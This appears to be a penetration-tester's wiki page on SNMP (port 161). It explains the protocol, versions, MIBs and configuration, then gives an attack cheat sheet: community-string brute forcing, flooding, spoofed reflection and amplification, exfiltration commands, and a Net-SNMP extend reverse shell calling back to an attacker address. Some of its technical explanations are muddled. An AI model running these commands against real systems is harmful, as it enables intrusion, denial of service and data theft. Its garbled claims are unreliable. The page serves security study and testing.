# P161 SNMP

## Index

* \[\[Ports, Protocols, and Services]]
  * \[\[P162 SNMP Trap]]

## Simple Network Management Protocol (SNMP)

* **Port Number:** 161 (UDP/TCP for SNMP queries), 162 (UDP/TCP for SNMP traps)
* **Protocol:** UDP/TCP
* **Service Name:** SNMP (Simple Network Management Protocol)
* **Defined in:** RFC 1157, RFC 3411-3418

The Simple Network Management Protocol (SNMP) is a widely used protocol for managing and monitoring devices on IP networks. These devices can include routers, switches, servers, printers, and more. SNMP allows network administrators to manage network performance, find and solve network problems, and plan for network growth. It provides a standardized framework for exchanging management information between network devices.

### Overview of Features

* **Supports Multiple Versions:**
  * **SNMPv1:** The original version with basic features.
  * **SNMPv2c:** Introduced enhancements such as bulk transfers, but with similar security features as v1.
  * **SNMPv3:** Offers significant improvements in security, including authentication and encryption.
* **Community Strings:** SNMP uses community strings as a form of rudimentary authentication. These strings are essentially passwords that grant access to the SNMP data.
* **Management Information Base (MIB):** SNMP uses a hierarchical namespace containing object identifiers (OIDs) to organize the data it can access. Each OID identifies a variable that can be read or set via SNMP.
* **Polling and Trapping:**
  * **Polling:** SNMP agents are queried by an SNMP manager at regular intervals.
  * **Trapping:** SNMP agents send unsolicited alerts (traps) to the SNMP manager when certain events occur.
* **Transport Independence:** Although SNMP commonly uses UDP, it can operate over various transport protocols, including TCP and IPX.
* **Stateless Operation:** SNMP primarily uses UDP, a connectionless protocol, making it more lightweight but also susceptible to certain types of attacks.
* **Extensibility:** SNMP's MIBs allow for easy extensibility, supporting custom monitoring and management for various types of devices.

### Typical Use Cases

* **Network Device Monitoring:** SNMP is used to monitor the status, performance, and health of network devices.
* **Configuration Management:** Allows network administrators to modify device configurations remotely.
* **Fault Management:** Through SNMP traps, administrators can be alerted to faults or issues in the network in real-time.
* **Performance Management:** SNMP can be used to collect data on network performance metrics, helping with capacity planning and optimization.
* **Security Management:** While not its primary function, SNMP can be used to monitor security-related information, such as failed login attempts or unauthorized access.

### How SNMP Works

1. **SNMP Architecture:**
   * **Step 1:** **SNMP Manager:** Central system that manages or monitors a set of SNMP-enabled devices.
   * **Step 2:** **SNMP Agent:** Software module running on a managed device (e.g., router, switch) that reports information via SNMP to the SNMP manager.
   * **Step 3:** **Management Information Base (MIB):** Database used by the agent, containing the definitions of the network objects that can be managed.
2. **SNMP Operations:**
   * **Step 4:** **GetRequest:** The SNMP manager sends a request to the agent to retrieve the value of an OID.
   * **Step 5:** **GetNextRequest:** The manager requests the next OID in the MIB hierarchy.
   * **Step 6:** **SetRequest:** The manager sets the value of an OID on the agent.
   * **Step 7:** **GetBulkRequest** (SNMPv2+): The manager requests a bulk transfer of data from the agent.
   * **Step 8:** **Response:** The agent responds with the requested data or confirms the set operation.
   * **Step 9:** **Trap:** The agent sends an unsolicited notification to the manager, indicating an event such as an error or threshold being reached.
3. **Transport:**
   * **Step 10:** SNMP messages are typically transmitted over UDP on port 161 for queries and port 162 for traps.
   * **Step 11:** SNMP can also use TCP, particularly for larger or more reliable transmissions.
4. **Security Mechanisms (SNMPv3):**
   * **Step 12:** **User-based Security Model (USM):** Provides authentication and privacy (encryption) features.
   * **Step 13:** **Access Control:** Managed via the View-based Access Control Model (VACM), controlling access to MIB objects based on user roles.

#### Diagram (Hypothetical Example)

* **SNMP Manager:** `<attack_ip>` sends a `GetRequest` for system uptime to `<target_ip>`:161.
* **SNMP Agent:** `<target_ip>` responds with the uptime information.

## Additional Information

### SNMP Versions

#### SNMPv1

SNMP version 1 (SNMPv1) is used for network management and monitoring. SNMPv1 is the first version of the protocol and is still in use in many small networks. It supports the retrieval of information from network devices, allows for the configuration of devices, and provides traps, which are notifications of events. However, SNMPv1 has no built-in authentication mechanism, meaning anyone accessing the network can read and modify network data. Another main flaw of SNMPv1 is that it does not support encryption, meaning that all data is sent in plain text and can be easily intercepted. Main one, it is still the most frequent, the authentication is based on a string (community string) that travels in plain-text (all the information travels in plain text). Version 2 and 2c send the traffic in plain text also and uses a community string as authentication.

#### SNMPv2

SNMPv2 existed in different versions. The version still exists today is v2c, and the extension c means community-based SNMP. Regarding security, SNMPv2 is on par with SNMPv1 and has been extended with additional functions from the party-based SNMP no longer in use. However, a significant problem with the initial execution of the SNMP protocol is that the community string that provides security is only transmitted in plain text, meaning it has no built-in encryption.

#### SNMPv3

The security has been increased enormously for SNMPv3 by security features such as authentication using username and password and transmission encryption (via pre-shared key) of the data. However, the complexity also increases to the same extent, with significantly more configuration options than v2c. Uses a better authentication form and the information travels encrypted using (dictionary attack could be performed but would be much harder to find the correct creds than in SNMPv1 and v2).

### MIB

To ensure that SNMP access works across manufacturers and with different client-server combinations, the Management Information Base (MIB) was created. MIB is an independent format for storing device information. A MIB is a text file in which all queryable SNMP objects of a device are listed in a standardized tree hierarchy. It contains at least one Object Identifier (OID), which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object. MIB files are written in the Abstract Syntax Notation One (ASN.1) based ASCII text format. The MIBs do not contain data, but they explain where to find which information and what it looks like, which returns values for the specific OID, or which data type is used.

### OIDs

OIDs stands for Object Identifiers. OIDs uniquely identify managed objects in a MIB hierarchy. This can be depicted as a tree, the levels of which are assigned by different organizations. Top level MIB object IDs (OIDs) belong to different standard organizations. Vendors define private branches including managed objects for their own products.

You can navigate through an OID tree from the web here: [http://www.oid-info.com/cgi-bin/display?tree=#focus](http://www.oid-info.com/cgi-bin/display?tree=#focus) or see what a OID means (like 1.3.6.1.2.1.1) accessing [http://oid-info.com/get/1.3.6.1.2.1.1](http://oid-info.com/get/1.3.6.1.2.1.1).

There are some well-known OIDs like the ones inside 1.3.6.1.2.1 that references MIB-2 defined Simple Network Management Protocol (SNMP) variables. And from the OIDs pending from this one you can obtain some interesting host data (system data, network data, processes data...)

#### OID Example

```bash
1 . 3 . 6 . 1 . 4 . 1 . 1452 . 1 . 2 . 5 . 1 . 3. 21 . 1 . 4 . 7
```

Here is a breakdown of this address.

* 1 – this is called the ISO and it establishes that this is an OID. This is why all OIDs start with “1”
* 3 – this is called ORG and it is used to specify the organization that built the device.
* 6 – this is the dod or the Department of Defense which is the organization that established the Internet first.
* 1 – this is the value of the internet to denote that all communications will happen through the Internet.
* 4 – this value determines that this device is made by a private organization and not a government one.
* 1 – this value denotes that the device is made by an enterprise or a business entity.

These first six values tend to be the same for all devices and they give you the basic information about them. This sequence of numbers will be the same for all OIDs, except when the device is made by the government.

Moving on to the next set of numbers.

* 1452 – gives the name of the organization that manufactured this device.
* 1 – explains the type of device. In this case, it is an alarm clock.
* 2 – determines that this device is a remote terminal unit.

The rest of the values give specific information about the device.

* 5 – denotes a discrete alarm point.
* 1 – specific point in the device
* 3 – port
* 21 – address of the port
* 1 – display for the port
* 4 – point number
* 7 – state of the point

### Community Strings

As mentioned before, in order to access the information saved on the MIB you need to know the community string on versions 1 and 2/2c and the credentials on version 3.

The are 2 types of community strings:

* public mainly read only functions
* private Read/Write in general

Note that the writability of an OID depends on the community string used, so even if you find that "public" is being used, you could be able to write some values. Also, there may exist objects which are always "Read Only". If you try to write an object a noSuchName or readOnly error is received\*\*.\*\*

In versions 1 and 2/2c if you to use a bad community string the server wont respond. So, if it responds, a valid community strings was used.

### SNMP Operations

SNMP defines several operations for communication between the manager and the agent:

1. **GetRequest:** Retrieve a specific value from the agent.
2. **SetRequest:** Modify a specific value on the agent.
3. **GetNextRequest:** Retrieve the next value in the agent's Management Information Base (MIB).
4. **GetBulkRequest:** Retrieve large blocks of data from the agent (introduced in SNMPv2).
5. **Response:** Sent by the agent in reply to a GetRequest, SetRequest, GetNextRequest, or GetBulkRequest.
6. **Trap:** An unsolicited message from the agent to the manager, alerting about significant events.
7. **InformRequest:** Similar to traps but includes an acknowledgment from the manager (introduced in SNMPv2).

### Security Considerations

* **Community Strings:** These are plaintext passwords used in SNMPv1 and SNMPv2c. The "public" and "private" community strings are commonly used defaults.
* **SNMPv3 Security:** SNMPv3 supports authentication and encryption, but proper configuration is essential to ensure security.
* **Vulnerability to Sniffing:** SNMPv1 and SNMPv2c traffic can be easily captured and analyzed since they lack encryption.

### Advanced Usage

* **Custom SNMP Traps:** Administrators can configure devices to send custom traps when certain thresholds are met (e.g., CPU usage exceeds 90%).
* **SNMP Proxies:** In some environments, SNMP proxies are used to aggregate data from multiple agents before sending it to the manager.

### Modes of Operation

* **Polling Mode:** Regular querying of devices by the SNMP manager to gather statistics or check statuses.
* **Event-driven Mode:** Using SNMP traps to receive notifications only when specific events occur.

### Configuration Files

1. **Linux (Net-SNMP):**

* **File Location:** `/etc/snmp/snmpd.conf`
*   **Configuration Example:**

    ```bash
    com2sec readonly  default         public
    group   MyROGroup  v1        readonly
    group   MyROGroup  v2c       readonly
    group   MyROGroup  usm       readonly
    view    all    included  .1                               80
    access  MyROGroup ""      any       noauth    exact  all    none   none
    ```
* **Key Settings:**
  * `com2sec`: Maps a security name to a community string.
  * `group`: Assigns security names to groups.
  * `view`: Specifies which parts of the MIB tree are accessible.
  * `access`: Defines access rights based on security levels.

2. **Windows SNMP Service:**

* **File Location:** `Registry Editor`
* **Configuration Example:**
  * **Registry Path:** `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters`
  * **Key Settings:**
    * `PermittedManagers`: Defines which IP addresses can query the SNMP service.
    * `ValidCommunities`: Lists community strings and their associated access levels.

3. **SNMP Manager Configuration:**

* **Configuration Location:** Dependent on the SNMP management software in use (e.g., SolarWinds, Nagios).
* **Configuration Example:**
  * **Polling Interval:** Define how often the SNMP manager queries devices.
  * **Trap Handling:** Configure how traps are processed and logged.

### Potential Misconfigurations

1. **Default Community Strings:**
   * **Risk:** Using default community strings like "public" and "private" can lead to unauthorized access.
   * **Exploitation:** An attacker can easily guess these community strings and gain access to sensitive information or even change device configurations.
2. **Open SNMP Ports:**
   * **Risk:** Leaving SNMP ports (161/162) open to the internet or untrusted networks exposes devices to attacks.
   * **Exploitation:** Attackers can scan for and interact with SNMP services using tools like `snmpwalk`, potentially gathering detailed information about network devices.
3. **Weak SNMPv3 Configuration:**
   * **Risk:** Incorrect configuration of SNMPv3 can negate its security benefits, such as not enabling encryption (privacy).
   * **Exploitation:** An attacker with access to the network could sniff SNMPv3 traffic or brute-force credentials.
4. **Excessive MIB Access:**
   * **Risk:** Granting too broad access to the MIB can lead to exposure of sensitive data or unauthorized configuration changes.
   * **Exploitation:** Attackers could use this access to modify critical device settings, leading to potential service disruption.

### Default Credentials

#### Common SNMP Community Strings

* **Public (Read-Only):** `public`
* **Private (Read-Write):** `private`

#### SNMPv3 Default Users

* **Example User:** `admin` (depends on device/vendor)
* **Example Password:** Typically vendor-specific, often weak or left as default.

## Interaction and Tools

### Tools

#### \[\[SNMPWalk]]

*   **Retrieve a subtree of management values:** Retrieves a subtree of the MIB, starting from a specified OID.

    ```bash
    snmpwalk -v <snmp_version> -c <community_string> <target_ip> <oid>
    ```
*   **Get IPv6, needed dec2hex:**

    ```bash
    snmpwalk -v <snmp_version> -c <community_string> <target_ip> 1.3.6.1.2.1.4.34.1.3 
    ```
*   **Get extended:**

    ```bash
    snmpwalk -v <snmp_version> -c <community_string> <target_ip> NET-SNMP-EXTEND-MIB::nsExtendObjects
    ```

#### \[\[SNMPBulkWalk]]

*   **Bulk SNMP Query:** Retrieves large amounts of information from a target using a single SNMP request. Don't forget the final dot.

    ```bash
    snmpbulkwalk -v <snmp_version> -c <community_string> <target_ip> . 
    ```

#### \[\[SNMPGet]]

*   **Retrieve the value of a specific OID:**

    ```bash
    snmpget -v <snmp_version> -c <community_string> <target_ip> <oid>
    ```
*   **Get system description:**

    ```bash
    snmpget -v <snmp_version> -c <community_string> <target_ip> .1.3.6.1.2.1.1.1.0
    ```
*   **Get system uptime:** Fetch the system uptime from a network device.

    ```bash
    snmpget -v <snmp_version> -c <community_string> <target_ip> .1.3.6.1.2.1.1.3.0
    ```
*   **SNMPv3 Command with Authentication:** Retrieves data using SNMPv3 with both authentication and encryption.

    ```bash
    snmpget -v 3 -u admin -a MD5 -A authpass -x DES -X privpass -l authPriv <target_ip> .1.3.6.1.2.1.1.1.0
    ```

#### \[\[SNMPSet]]

*   **Set the value of a specific OID:** Sets a new value for a specific OID on the target device.

    ```bash
    snmpset -v <snmp_version> -c <community_string> <target_ip> .1.3.6.1.2.1.1.5.0 s "New Device Name"
    ```

#### \[\[SNMPTrap]]

*   **Send a trap to an SNMP manager:** Sending a test trap to an SNMP manager for monitoring purposes.

    ```bash
    snmptrap -v <snmp_version> -c <community_string> <target_ip> '' .1.3.6.1.2.1.1.6.0
    ```

    ```bash
    snmptrap -v <snmp_version> -c <community_string> <manager_ip> "" .1.3.6.1.4.1.8072.2.3.0.1
    ```
*   **Sending a Test Trap (SNMPv1):** Sends a simple SNMPv1 trap to the specified NMS.

    ```bash
    snmptrap -v 1 -c <community_string> <nms_ip> "" <oid> s "Test message"
    ```
*   **Sending a Test Trap (SNMPv2c):** Sends a simple SNMPv2c trap to the specified NMS.

    ```bash
    snmptrap -v 2c -c <community_string> <nms_ip> "" <oid> s "Test message"
    ```
*   **Sending a Test Trap (SNMPv3):** Sends a secure SNMPv3 trap using authentication and encryption.

    ```bash
    snmptrap -v 3 -u <username> -l authPriv -a MD5 -A mypassword -x DES -X myprivpassword <nms_ip> "" <oid> s "Test message"
    ```
*   **Sending a Trap with Custom OIDs:** Sends a trap with multiple OIDs, each representing different pieces of information.

    ```bash
    snmptrap -v 2c -c public <nms_ip> "" <oid1> s "Value1" <oid2> i 123
    ```

#### \[\[SNMPTrapd]]

*   **SNMP Trap Receiver:** Runs a daemon to listen for SNMP traps in real-time.

    ```bash
    snmptrapd -f -Lo
    ```
*   **Filtering Traps Based on OIDs:** Filters incoming traps to only display those that match a specific OID.

    ```bash
    snmptrapd -On -f | grep <oid>
    ```

### Exploitation Tools

#### \[\[Metasploit]]

#### \[\[Wireshark]]

*   **Wireshark Packet Capture:**

    ```bash
    wireshark -i <interface> -f "tcp port 161"
    ```

#### \[\[Nmap]]

*   **Basic Nmap Scan:** Scan target on specified port to verify if service is on.

    ```bash
    nmap <target_ip> -p 161
    ```

#### \[\[NetCat]]

*   **Netcat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 161
    ```
*   **Netcat UDP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 161 -u
    ```
*   **Execute Commands:** Execute commands on target.

    ```bash
    echo "<command>" | nc <target_ip> 161
    ```
*   **Exfiltrate Data:** Exfiltrate data over specified port.

    ```bash
    nc <target_ip> 161 < secret_data.txt
    ```

#### \[\[SoCat Cheat Sheet]]

*   **Socat TCP Connect:** Simple tests to verify port service is running and responding.

    ```bash
    socat - TCP:<target_ip>:161
    ```

#### \[\[HPing3 Cheat Sheet]]

*   **Send UDP Packet:** Send a single UDP packet to the service.

    ```bash
    hping3 -2 <target_ip> -p 161 -c 1
    ```

#### \[\[OneSixtyOne]]

*   **Brute force community strings:**

    ```bash
    onesixtyone -c <path/to/wordlist> <target_ip>
    ```

### Other Techniques

#### SNMP via Email Clients

* **Description:** Leverage GUI email clients to access SNMP.
  * **\[\[Evolution]]**
  * **\[\[Thunderbird]]**
  * **\[\[Microsoft Outlook]]**

## Penetration Testing Techniques

### External Reconnaissance

#### Port Scanning

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap <target_ip> -p 161
    ```
* **Description:** Identifies if the target service is running on the target by scanning target port.

#### Service Enumeration

*   **Tool:** \[\[NetCat]]

    ```bash
    nc <target_ip> 161
    ```
* **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

#### SNMP Enumeration

*   **Tool:** \[\[SNMPWalk]]

    ```bash
    snmpwalk -v <snmp_version> -c <community_string> <target_ip>
    ```
* **Description:** Enumerates the SNMP service to gather detailed information about the target device.

#### Community String Brute Force

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap <target_ip> -p 161 -sU --script=snmp-brute 
    ```

\


*   **Tool:** \[\[OneSixtyOne]]

    ```bash
    onesixtyone -c <path/to/wordlist> <target_ip>
    ```

    \

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra -P /path/to/wordlist.txt snmp://<target_ip>
    ```
* **Description:** Attempt to brute force SNMP community strings, potentially gaining control over SNMP trap configurations.

### Persistence

#### Maintaining Access via SNMP

*   **Tool:** Custom Scripts

    ```bash
    while true; do snmpget -v <snmp_version> -c <community_string> <target_ip> .1.3.6.1.2.1.1.3.0; sleep 60; done
    ```
* **Description:** Continuously monitor a device to maintain a foothold on the network.

### Credential Harvesting

#### Packet Capture

*   **Tool:** \[\[Wireshark]]

    ```bash
    wireshark -i <interface> -f "tcp port 161"
    ```
* **Description:** Capture traffic and extract plaintext credentials.

### Privilege Escalation

#### Abuse of SNMP Write Access

*   **Tool:** \[\[SNMPSet]]

    ```bash
    snmpset -v <snmp_version> -c <community_string> <target_ip> .1.3.6.1.2.1.1.6.0 s "Privileged Access"
    ```
* **Description:** Escalate privileges by modifying critical device settings or configurations.

### Defense Evasion

#### Using Encrypted SNMPv3

*   **Tool:** \[\[SNMPGet]], \[\[SNMPWalk]]

    ```bash
    snmpget -v 3 -u admin -a MD5 -A authpass -x DES -X privpass -l authPriv <target_ip> .1.3.6.1.2.1.1.1.0
    ```
* **Description:** Use SNMPv3 with encryption to evade detection while interacting with network devices.

#### Hiding in SNMP Trap Storms

* **Tool:** \[\[SNMPTrap]]

```bash
for i in {1..1000}; do snmptrap -v2c -c public <manager_ip> "" .1.3.6.1.2.1.1.3.0 .1.3.6.1.4.1.8072.2.3.0.1; done
```

* **Description:** Flood the SNMP manager with traps to obscure malicious activity or distract administrators.

### Data Exfiltration

#### Exfiltrating Data via SNMP

*   **Tool:** \[\[Custom Scripts]], \[\[SNMPSet]]

    ```bash
    snmpset -v 2c -c private <target_ip> .1.3.6.1.2.1.1.8.0 s "Exfiltrated Data"
    ```
* **Description:** Covertly exfiltrate data by writing it to an SNMP-enabled device’s MIB.

#### Exfiltrating Data via Trap Covert Channels

* **Tool:** \[\[SNMPTrap]]

```bash
snmptrap -v2c -c public <manager_ip> "" .1.3.6.1.2.1.1.3.0 .1.3.6.1.4.1.8072.2.3.0.1 s "exfiltrated_data"
```

* **Description:** Use SNMP traps to covertly transmit sensitive information to an attacker-controlled SNMP manager.

## Exploits and Attacks

### Password Attacks

#### Brute-Forcing SNMPv3 Credentials

* **Tool:** \[\[Metasploit]]

```bash
use auxiliary/scanner/snmp/snmp_login
set RHOSTS <target_ip>
set VERSION 3
set USERNAME snmpv3user
set PASS_FILE /path/to/password_list.txt
run
```

* **Description:** Attempts to brute-force SNMPv3 credentials to gain unauthorized access.

### Denial of Service

#### TCP/UPD Flood Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
* **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

#### TCP/UDP Reflection Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
* **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

#### SNMP Flooding

*   **Tool:** \[\[SNMPWalk]]

    ```bash
    while true; do snmpwalk -v 2c -c public <target_ip>; done
    ```
* **Description:** Flood the SNMP service with requests, consuming network and device resources, potentially leading to a denial of service.

#### SNMP Amplification Attack

*   **Tool:** \[\[Scapy]]

    ```python
    from scapy.all import *
    send(IP(src="<spoofed_ip>", dst="<target_ip>")/UDP(dport=161)/SNMP(community="public",PDU=SNMPget()))
    ```
* **Description:** Exploit SNMP to amplify traffic towards a victim, causing network congestion or disruption.

#### SNMP Buffer Overflow (CVE-2002-0013)

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/linux/snmp/net-snmp_write
    set RHOSTS <target_ip>
    set COMMUNITY public
    run
    ```
* **Description:** Exploits a buffer overflow vulnerability in Net-SNMP, allowing remote code execution on the target device.

### Exploits

#### SNMP Configuration Injection

* **Tool:** \[\[SNMPSet]]

```bash
    snmpset -v <snmp_version> -c <community_string> <target_ip> .1.3.6.1.2.1.1.6.0 s "Privileged Access"
```

\


*   **Tool:** \[\[Metasploit]]

    ```bash
    use auxiliary/admin/snmp/snmp_set
    set RHOSTS <target_ip>
    set COMMUNITY private
    set OID 1.3.6.1.4.1.9.9.96.1.1.1.1.14.1.1
    set VALUE "malicious_config"
    run
    ```
* **Description:** Injects malicious configurations into SNMP-enabled devices, potentially leading to further exploitation or persistent access.

#### Remote Code Execution

SNMP is sometimes overseen by the administrator of the device or server where it is left in a default configuration. SNMP community with write permissions (`rwcommunity`) on the Linux operating system can be abused to let the attacker execute a command on the server.

*   **Extending Services:** While you are not able to modify existing entries that were configured in `snmpd.conf`, it is possible to add additional commands over SNMP, because the `MAX-ACCESS` permission setting in the MIB definition is set to `read-create`. Adding a new command basically works by appending an additional row to the `nsExtendObjects` table.

    ```bash
    snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
    'nsExtendStatus."evilcommand"' = createAndGo \
    'nsExtendCommand."evilcommand"' = /bin/echo \
    'nsExtendArgs."evilcommand"' = 'hello world'
    ```

    Injecting a command to run on the SNMP service. `NET-SNMP-EXTEND-MIB` requires that you always provide the absolute path to the executable. The called binary/script must also exist and be executable.
*   **Execute The Injected Command:** Execute the command that we injected to the SNMP by enumerating it using snmpwalk.

    ```bash
    snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
    ```
*   **Gain a Shell from Net-SNMP Extend:** In this section, I would like to discuss how to gain a server shell to control the server. You can use python script developed by mxrch that can be downloaded from [Github - SNMP-Shell](https://github.com/mxrch/snmp-shell.git). To install the pre-requisites to run:

    ```bash
    sudo apt install snmp snmp-mibs-downloader rlwrap -y
    git clone https://github.com/mxrch/snmp-shell
    cd snmp-shell
    sudo python3 -m pip install -r requirements.txt
    ```
*   **Creating Reverse Shell:** You can also create reverse shell manually by injecting the command below into the SNMP.

    ```bash
    snmpset -m +NET-SNMP-EXTEND-MIB -v <snmp_version> -c <community_string> <target_ip> 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"<attack_ip>\",<attack_port>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
    ```

## Resources

| **Website**                | **URL**                                                                       |
| -------------------------- | ----------------------------------------------------------------------------- |
| RFC 1157                   | https://tools.ietf.org/html/rfc1157                                           |
| SNMPv3 RFCs                | https://tools.ietf.org/html/rfc3411                                           |
| Net-SNMP Documentation     | https://www.net-snmp.org/docs/man/snmpd.html                                  |
| Nmap SNMP Scripts          | https://nmap.org/nsedoc/scripts/snmp.html                                     |
| Metasploit SNMP Modules    | https://www.rapid7.com/db/modules/auxiliary/scanner/snmp/snmp\_enum           |
| Wireshark SNMP Analysis    | https://wiki.wireshark.org/SNMP                                               |
| SolarWinds SNMP Monitoring | https://www.solarwinds.com/snmp-monitoring                                    |
| SNMP Tutorial and FAQ      | https://www.zabbix.com/documentation/current/manual/discovery/snmp\_discovery |
| Scapy Documentation        | https://scapy.readthedocs.io/en/latest/                                       |
| Linux man-pages            | https://man7.org/linux/man-pages/                                             |
